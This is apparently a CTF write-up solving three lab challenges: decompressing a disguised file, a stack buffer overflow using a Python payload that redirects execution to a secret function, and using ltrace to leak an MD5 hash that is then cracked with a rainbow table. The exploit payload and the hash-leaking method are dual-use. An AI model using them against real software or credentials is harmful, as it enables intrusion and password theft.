# Ryan CTF: Extreme

### Mystery File

At first look, we can see that the file contains ascii text as well as some binary data. Run `xxd` on the file.

```
00000000: 6861 6861 6861 6861 6861 6861 6861 6861  hahahahahahahaha
00000010: 0a1f 8b08 0006 da58 5a00 03ed d0b1 0ac2  .......XZ.......                   
00000020: 3014 85e1 cc3e 459e 40ee 8d69 06b7 2e71  0....>E.@..i...q                   
00000030: e94b 746a 0721 1023 b46f 6f14 ba38 a84b  .Ktj.!.#.oo..8.K                   
00000040: 28c2 ff2d 67b8 7738 9c78 1da7 6359 8a69  (..-g.w8.x..cY.i                   
00000050: 48aa e0fd 2bab f714 7162 f4e4 5cd0 ce77  H...+...qb..\..w                   
00000060: cf3f 550d de58 6959 6a73 bf95 315b 6b72  .?U..XiYjs..1[kr                   
00000070: 4a1f 47f8 76ff 5371 e82f 673b af53 4e75  J.G.v.Sq./g;.SNu                   
00000080: 8872 d8bb 0f00 0000 0000 0000 0000 0000  .r..............                   
00000090: 0000 e037 0f35 35d1 ef00 2800 00         ...7.55...(..   
````

Let's get rid of the `hahahahahahahaha` part. Through a simple search [here](https://en.wikipedia.org/wiki/List_of_file_signatures), we find out that `XZ` is a compression format.
try to decompress the remaining part with `unxz` to get `FLAG: hygrostat`

### Everyday I'm Bufferin'
We find out that there is a "secret" function at `0804853B` that writes the flag.
Since the called `scanf` doesn't have any limits to reading, we can perform a buffer overflow to overwrite the return address of the `echo` function.
Let's test to see how long is buffer.
`pythoc -c "print 'A'*50" | ./program` will bring us `Segmentation fault (core dumped)`, but `30` or `28` don't. So we've found the maximum length of the buffer.
Let's construct the payload. We need `32 * 'A'` (to cover for `0x1C` length of the buffer and also the old ebp on the stack) and `\x3B\x85\x04\x08` which is the address of the secret function in `little-endian` order.
Run `python -c "print 'A'*32 + '\x3B\x85\x04\x08'" | ./program` to get 
```
You've found the secret function!                                                             
The flag is: bicollateral 
```
Great!


### Strings won't help you...

We have an executable the is owned by root. If we execute it normally, it says `cat: /root/md5.hash: Permission denied` so probably it has something to do with hashing the password
we give and comparing it to the exiting hash in the `md5.hash` file. But how can we possibly find out the contents of the hash file?
First, we need to run the file as `root` let's `sudo ./program`. Now it works perfectly.
Let's try to run `ltrace` on the binary to see what system calls it makes. 

```
popen("cat /root/md5.hash", "r")  = 0x1718010                                                                      
fgets("6499cd1ef35fcb53529488cfa85ab9c6"..., 100, 0x1718010) = 0x7ffd035ec6d0            
--- SIGCHLD (Child exited) ---         
fgets("6499cd1ef35fcb53529488cfa85ab9c6"..., 100, 0x1718010)
printf("Enter the password for the flag:"...)
```

Great, so we have the MD5 `6499cd1ef35fcb53529488cfa85ab9c6`, let's rainbow table it to get `bigbangtheory1`. 
After running it with the correct password, we get
```
You got it! Here's the flag:                          
fumatorium
```